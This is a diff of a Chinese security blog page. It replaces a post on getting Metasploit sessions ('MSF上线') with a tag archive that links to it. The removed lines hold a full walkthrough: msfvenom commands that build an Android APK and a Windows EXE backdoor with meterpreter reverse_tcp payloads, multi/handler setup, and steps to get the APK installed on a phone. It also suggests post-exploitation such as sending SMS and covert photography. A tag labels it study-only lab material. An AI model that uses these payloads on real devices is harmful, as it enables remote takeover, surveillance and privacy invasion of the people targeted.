@@ -10,7 +10,7 @@
     
     
     
-    <title>MSF上线 | EternalGemini</title>
+    <title>Tags: 仅供学习参观！ | EternalGemini</title>
     <!-- inject:style -->
     <link href="/css/style.css" rel="stylesheet" type="text/css">
     <!-- endinject -->
@@ -160,83 +160,29 @@
     
     <div class="cube-content">
         <div class="cube-left">
-            <div class="cube-article">
-    <h1 class="title">MSF上线</h1>
+            <style>
+    @media(max-width: 768px) {
+        body {
+            background-color: #fff!important;
+        }
+    }
+</style>
+<div class="cube-archives">
     
-    <div class="cube-article-header">
-        <div class="cube-article-date page">
-            <i class="cube-icon cube-icon-date" aria-hidden="true"></i>
-            <!-- moment.js对象 -->
-            2022-02-14
-        </div>
-    </div>
-    
-    <div class="cube-article-content cube-markdown">
+    <div class="cube-archive" style="margin-top: 0;">
+        <h1 class="title">仅供学习参观！</h1>
         
-        <p>做了两个关于MSF上线的小实验，一个关于安卓手机，另一个关于windows操作系统。(同一个局域网下)</p>
-<span id="more"></span>
-
-<p>一、安卓手机MSF上线</p>
-<p>1.打开kali，在命令窗口中输入 ifconfig 查看kali的ip地址</p>
-
-
-<p>2.接着输入命令  </p>
-<p>msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.0.108 lport=5555 &gt; 1.apk</p>
-<p>（这里lhost是kali的ip地址，lport自己选择，1.apk也是可以自己取名的）</p>
-
-
-<p>可以在root文件夹中看到生成了一个1.apk文件</p>
-
-
-<p>3.启用msf工具，输入msfconsole</p>
-
-
-<p>4.选择攻击模块 输入命令 use exploit/multi/handler</p>
-
-
-<p>设置攻击载荷反向tcp链接，lhost和lport</p>
-<p>set payload android/meterpreter/reverse_tcp</p>
-<p>set LHOST 1921.168.0.108</p>
-<p>set lport 5555</p>
-<p>执行攻击 run</p>
-
-
-<p>5.将1.apk文件发送到手机上并安装（我使用的是oppo A5，新的手机可能实现不了）</p>
-<p>安装之后点击一下，然后就可以看到kali已经成功入侵了手机啦</p>
-
-
-
-
-<p>6.又是渗透后的利用，可以发短信，偷拍等，自行发挥吧</p>
-
-
-<p>二、windows操作系统MSF上线</p>
-<p>1.查看kali的ip ifconfig（我上面的ip是192.168.0.108，接着使用一下）</p>
-<p>2.生成 .exe后门文件</p>
-<p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=6060 -f exe &gt; 谁用谁牛逼.exe</p>
-
-
-<p>3.启用msf工具，输入msfconsole</p>
-<p>4.选择攻击模块 输入命令 use exploit/multi/handler</p>
-<p>设置攻击载荷反向tcp链接，lhost和lport</p>
-<p>set payload windows/meterpreter/reverse_tcp</p>
-<p>set LHOST 192.168.0.108</p>
-<p>set LPORT 6060</p>
-<p>执行攻击 run（和上面的步骤差不多，注意把android改成windows）</p>
-
-
-<p>5.在靶机上双击后门文件，kali中显示上线了</p>
-
-
-
-
-<p>6.渗透后利用。。。自己琢磨吧，为所欲为。</p>
-
+        <ul class="posts">
+            
+            <li class="post">
+                <a href="/posts/be14.html">MSF上线</a>
+            </li>
+            
+        </ul>
+        
     </div>
+    
 </div>
-
-
-
         </div>
         <div class="cube-right">
             
@@ -272,8 +218,8 @@
     
     
     <div class="count">
-        <a class="count articles"><span>0</span>Article</a>
-        <a class="count tags"><span>0</span>Tags</a>
+        <a class="count articles"><span>3</span>Article</a>
+        <a class="count tags"><span>3</span>Tags</a>
         <a class="count categories"><span>0</span>Categories</a>
     </div>
 </div>
@@ -296,9 +242,84 @@
 
 
 
+<div class="cube-recent-posts cube-sidebar" id="cube-recent-posts">
+    <div class="title">
+        <a>Recent Posts</a>
+    </div>
+    <ul class="list">
+        
+        
+        <li>
+            <!-- TODO 如果文章要显示图片，那么在front-matter上添加preview属性(url or path) -->
+            
+            <div class="normal">
+                <p class="index first">
+                    <span>1</span>
+                </p>
+                <p class="title">
+                    <a href="/posts/2038.html" title="CS上线">CS上线</a>
+                </p>
+            </div>
+            
+        </li>
+        
+        
+        
+        <li>
+            <div class="normal">
+                <p class="index">
+                    <span>2</span>
+                </p>
+                <p class="title">
+                    <a href="/posts/be14.html" title="MSF上线">MSF上线</a>
+                </p>
+            </div>
+        </li>
+        
+        
+        
+        <li>
+            <div class="normal">
+                <p class="index">
+                    <span>3</span>
+                </p>
+                <p class="title">
+                    <a href="/posts/ae4b.html" title="MS17-010">MS17-010</a>
+                </p>
+            </div>
+        </li>
+        
+        
+    </ul>
+</div>
 
 
 
+
+
+<div class="cube-tagcloud cube-sidebar" id="cube-tagcloud">
+    <div class="title">
+        <a href="/tags">Tagcloud</a>
+    </div>
+    <div class="cube-boxs">
+        
+        
+        <div class="cube-box ">
+            <a href="/tags/%E4%BB%85%E4%BE%9B%E5%AD%A6%E4%B9%A0%E5%8F%82%E8%80%83%EF%BC%81%EF%BC%81%EF%BC%81/">#仅供学习参考！！！</a>
+        </div>
+        
+        
+        <div class="cube-box-bg ">
+            <a href="/tags/%E6%9C%AC%E5%AE%9E%E9%AA%8C%E4%BB%85%E4%BE%9B%E5%AD%A6%E4%B9%A0%E5%8F%82%E8%A7%82%EF%BC%81%EF%BC%81%EF%BC%81/">#本实验仅供学习参观！！！</a>
+        </div>
+        
+        
+        <div class="cube-box-bg ">
+            <a href="/tags/%E4%BB%85%E4%BE%9B%E5%AD%A6%E4%B9%A0%E5%8F%82%E8%A7%82%EF%BC%81/">#仅供学习参观！</a>
+        </div>
+        
+    </div>
+</div>
 
 
 
